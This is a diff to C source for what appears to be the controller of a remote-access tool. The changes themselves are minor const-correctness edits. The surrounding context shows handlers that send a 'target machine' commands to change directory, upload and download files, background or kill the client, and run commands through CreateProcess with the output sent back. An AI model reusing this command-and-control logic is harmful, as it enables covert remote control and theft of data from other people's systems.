@@ -17,7 +17,7 @@ Use this code educationally/legally.
 	#include <limits.h>
 	#include <fcntl.h>
 	#include <netdb.h>
-	#include <arpa/inet.h> 
+	#include <arpa/inet.h>
 	#include <pthread.h>
 	#include <string.h>
 #endif
@@ -121,7 +121,7 @@ void list_connections(Server_map* const s_map) {
 }
 
 // Function send change directory command to client.
-int client_chdir(char* const buf, const size_t cmd_len, SOCKET client_socket) {
+int client_chdir(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
 	// '1' is the command code for changing directory.
 	buf[3] = '1';
 	
@@ -148,7 +148,7 @@ int terminate_client(char* const buf, const size_t cmd_len, const SOCKET client_
 }
 
 // Function to receive file from target machine (TCP file transfer).
-int recv_file(char* const buf, const size_t cmd_len, SOCKET client_socket) {
+int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
 	// '4' is the command code for downloading a file from the client's file-system.
 	buf[9] = '4';
 
@@ -186,7 +186,7 @@ int recv_file(char* const buf, const size_t cmd_len, SOCKET client_socket) {
 }
 
 // Function to upload file to target machine (TCP file transfer).
-int send_file(char* const buf, const size_t cmd_len, SOCKET client_socket) {
+int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
 	// Open file.
 	s_file file = sakito_open_file(buf+8, READ);
  
@@ -225,7 +225,7 @@ int send_file(char* const buf, const size_t cmd_len, SOCKET client_socket) {
 }
 
 // Function to terminate/kill client.
-int background_client(char* const buf, const size_t cmd_len, SOCKET client_socket) {
+int background_client(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
 	// '5' is the command code for backgrounding the client.
 	if (sakito_tcp_send(client_socket, "5", 1) < 1)
 		return SOCKET_ERROR;
@@ -234,7 +234,7 @@ int background_client(char* const buf, const size_t cmd_len, SOCKET client_socke
 }
 
 // Function to send command to client to be executed via CreateProcess() and receive output.
-int client_exec(char* const buf, const size_t cmd_len, SOCKET client_socket) {
+int client_exec(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
  	buf[0] = '0';
 	// Send command to server.
 	if (sakito_tcp_send(client_socket, buf, cmd_len) < 1)
